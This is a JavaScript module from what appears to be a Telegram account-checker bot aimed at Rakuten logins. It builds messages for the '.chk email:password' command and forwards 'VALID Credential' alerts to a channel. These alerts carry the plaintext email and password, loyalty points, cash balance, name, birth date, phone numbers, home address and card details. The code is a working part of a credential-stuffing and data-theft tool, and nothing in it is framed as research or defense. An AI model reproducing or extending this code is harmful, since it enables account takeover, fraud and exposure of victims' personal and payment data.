/**
 * =============================================================================
 * CAPTURE MESSAGES - Data capture related messages
 * =============================================================================
 */

const { escapeV2, boldV2, codeV2, spoilerV2, spoilerCodeV2 } = require('./helpers');

/**
 * Builds capture prompt message.
 * @returns {string} Prompt message
 */
function buildCapturePrompt() {
  return escapeV2('🔍 Proceed to capture data?');
}

/**
 * Builds capture expired message.
 * @returns {string} Expired message
 */
function buildCaptureExpired() {
  return escapeV2('⌛ Capture session expired. Send `.chk email:password` again to restart.');
}

/**
 * Builds capture summary message.
 * @param {Object} data - Capture data
 * @returns {string} Summary message
 */
function buildCaptureSummary({ points, cash, username, password }) {
  return (
    escapeV2('🗂️ Capture Summary') +
    `\n• ${boldV2('Points')}: ${escapeV2(points || 'n/a')}` +
    `\n• ${boldV2('Rakuten Cash')}: ${escapeV2(cash || 'n/a')}` +
    `\n• Username: ${spoilerCodeV2(username || 'unknown')}` +
    `\n• Password: ${spoilerCodeV2(password || 'hidden')}`
  );
}

/**
 * Builds capture failed message.
 * @param {string} message - Error message
 * @returns {string} Failed message
 */
function buildCaptureFailed(message) {
  return `⚠️ Capture failed: ${escapeV2(message)}`;
}

/**
 * Builds capture skipped message.
 * @returns {string} Skipped message
 */
function buildCaptureSkipped() {
  return escapeV2('❎ Data capture skipped. Send `.chk` again if you want to restart.');
}

/**
 * Builds message for forwarding VALID credentials to channel.
 * @param {Object} params - Message parameters
 * @param {string} params.username - Email/username
 * @param {string} params.password - Password
 * @param {Object} [params.capture] - Capture data (points, rank, cash, profile, etc.)
 * @returns {string} MarkdownV2 formatted message
 */
function buildChannelForwardMessage({ username, password, capture = {} }) {
  const lines = [];
  
  // Header
  lines.push(escapeV2('✅ VALID Credential'));
  lines.push('');
  
  // Credential line: email:||password||
  lines.push(`${codeV2(username)}:${spoilerCodeV2(password)}`);
  lines.push('');
  
  // Account data section
  const hasCapture = capture && (capture.points || capture.rank || capture.cash);
  if (hasCapture) {
    lines.push(escapeV2('📊 Account Data:'));
    if (capture.points) lines.push(`  ${boldV2('Points')}: ${escapeV2(capture.points)}`);
    if (capture.cash) lines.push(`  ${boldV2('Cash')}: ${escapeV2(capture.cash)}`);
    if (capture.rank) lines.push(`  ${boldV2('Rank')}: ${escapeV2(capture.rank)}`);
    if (capture.latestOrder) lines.push(`  ${boldV2('Last Order')}: ${escapeV2(capture.latestOrder)}`);
    lines.push('');
  }
  
  // Profile section
  const profile = capture.profile;
  if (profile) {
    lines.push(escapeV2('👤 Profile:'));
    if (profile.name) lines.push(`  ${boldV2('Name')}: ${escapeV2(profile.name)}`);
    if (profile.email) lines.push(`  ${boldV2('Email')}: ${escapeV2(profile.email)}`);
    if (profile.dob) lines.push(`  ${boldV2('DOB')}: ${escapeV2(profile.dob)}`);
    if (profile.mobilePhone) lines.push(`  ${boldV2('Mobile')}: ${escapeV2(profile.mobilePhone)}`);
    if (profile.homePhone) lines.push(`  ${boldV2('Home')}: ${escapeV2(profile.homePhone)}`);
    if (profile.postalCode) {
      const addr = [profile.postalCode, profile.prefecture, profile.city, profile.address1].filter(Boolean).join(' ');
      if (addr) lines.push(`  ${boldV2('Address')}: ${escapeV2(addr)}`);
    }
    lines.push('');
  }
  
  // Cards section
  const cards = capture.profile?.cards;
  if (cards && cards.length > 0) {
    lines.push(escapeV2('💳 Cards:'));
    for (const card of cards) {
      const cardInfo = [card.brand, `****${card.last4}`, card.expiry].filter(Boolean).join(' ');
      lines.push(`  ${spoilerV2(cardInfo)}`);
    }
    lines.push('');
  }
  
  // Timestamp
  const now = new Date().toISOString().replace('T', ' ').slice(0, 19);
  lines.push(escapeV2(`🕐 ${now} UTC`));
  
  return lines.join('\n');
}

module.exports = {
  buildCapturePrompt,
  buildCaptureExpired,
  buildCaptureSummary,
  buildCaptureFailed,
  buildCaptureSkipped,
  buildChannelForwardMessage,
};

